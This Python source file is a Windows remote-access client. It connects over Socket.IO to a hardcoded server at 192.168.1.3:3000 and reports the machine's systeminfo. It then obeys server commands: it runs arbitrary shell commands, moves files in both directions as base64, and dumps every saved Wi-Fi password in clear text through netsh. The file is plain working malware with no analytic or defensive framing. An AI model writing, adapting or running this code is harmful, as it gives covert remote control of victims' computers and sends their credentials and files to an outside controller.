from socketio import Client
from platform import platform
from datetime import datetime
from subprocess import check_output,run,PIPE,DEVNULL
from sys import exit as EXIT
from re import search as re_search,findall as re_findall
from os import chdir,path as os_path
from base64 import b64decode,b64encode




class Main:
    def __init__(self) -> None:
        self.sio = None

    def changeDirectory(self,path):
        chdir(path)
        return f"[+] Changed to {path}"
    
    def downloadFileFromAdmin(self,file,filename):
        try:
            # Decode the base64 string to binary
            binary_data = b64decode(file)

            # Save the binary data to a file
            with open(filename, 'wb') as file:
                file.write(binary_data)

            return f'Image saved as {filename}'
        except Exception as e:
            return f'An error occurred: {str(e)}'
        
    def uploadFileToAdmin(self,filename):
        try:
            with open(filename, "rb") as image_file:
                base64_data = b64encode(image_file.read()).decode('utf-8')
            return base64_data
        except Exception as e:
            return 'An error occurred:', str(e)
        

    def get_battery_percentage(self):
        try:
            result = run(['WMIC', 'PATH', 'Win32_Battery', 'Get', 'EstimatedChargeRemaining'], capture_output=True, text=True)
            output = result.stdout
            battery_percentage = re_search(r'(\d+)', output)
            if battery_percentage:
                return f'Battery Percentage: {battery_percentage.group(1)}%'
            else:
                return 'Unable to retrieve battery percentage.'
        except Exception as e:
            return f'An error occurred: {str(e)}'


    def get_wifi_pass(self):
        wifis="\n\n"
        try:
            result = run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
            output = result.stdout
            ssid_list = re_findall(r'All User Profile\s*:\s*(.*)', output)
            for ssid in ssid_list:
                key_result = run(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], capture_output=True, text=True)
                key_output = key_result.stdout
                key_content = re_search(r'Key Content\s*:\s*(.*)', key_output)
                wifis += "---------------\n"
                wifiString =f"SSID : {ssid}\n KEY : {key_content.group(1) if(key_content)else'--'}\n"
                wifis+=wifiString
        except Exception as e:
            print(f'An error occurred: {str(e)}')
        return  wifis

    #join room
    def joinRoom(self):
        systemInfo =""
        info = check_output(['systeminfo'],stderr=DEVNULL,stdin=DEVNULL,shell=True).decode('utf-8').split('\n')
        for item in info:
            systemInfo = systemInfo+item+"\n<br>"

        self.sio.emit('joinRoom',{"user":True,"os":platform(),"time":datetime.now().strftime('%Y-%m-%d %H:%M:%S'),"data":systemInfo})



    #socket on event handle
    def socketConnection_On(self):
        #get command from server ,process and return data
        @self.sio.on('runcmd')
        def server_command(message):
            finalResult =""
            response_type ="n"
            otherValue=""
            command = message['cmd']
            splitted_command = command.split(" ")
            if splitted_command[0]=="exit":
                 self.sio.disconnect()
                 EXIT()
            elif splitted_command[0]=="upload":
                finalResult = self.downloadFileFromAdmin(file=message['file'],filename=message['filename'])
            elif splitted_command[0]=="download" and len(splitted_command)>1:
                print("download request found")
                print(f"downloading {splitted_command[1]}")
                response_type="f"
                otherValue=splitted_command[1]
                finalResult=self.uploadFileToAdmin(splitted_command[1])
                print(finalResult)
            elif splitted_command[0]=="wifipass":
                finalResult = self.get_wifi_pass()
            elif splitted_command[0]=="battery":
                finalResult = self.get_battery_percentage()
            elif splitted_command[0]=="cd" and len(splitted_command)>1:
                finalResult =self.changeDirectory(splitted_command[1])
            else:
                try:
                    result = run(splitted_command,shell=True,stdout=PIPE, stderr=PIPE, text=True)
                    finalResult = result.stdout
                except Exception as e:
                        finalResult="Wrong Command"
             
            self.sio.emit('reply',{"to":message['from'],"result":finalResult,"type":response_type,"add":otherValue})
    
        #pingtest
        @self.sio.on('pingTest')
        def pingtest(data):
            admin = data["from"]
            self.sio.emit("pingReply",{"to":admin})

        

    #socket client Runner
    def run(self):
        self.sio =Client()
        self.sio.connect('http://192.168.1.3:3000') 
        self.joinRoom()
        self.socketConnection_On()

try:
    main = Main()
    main.run()
except Exception:
    print("erro")
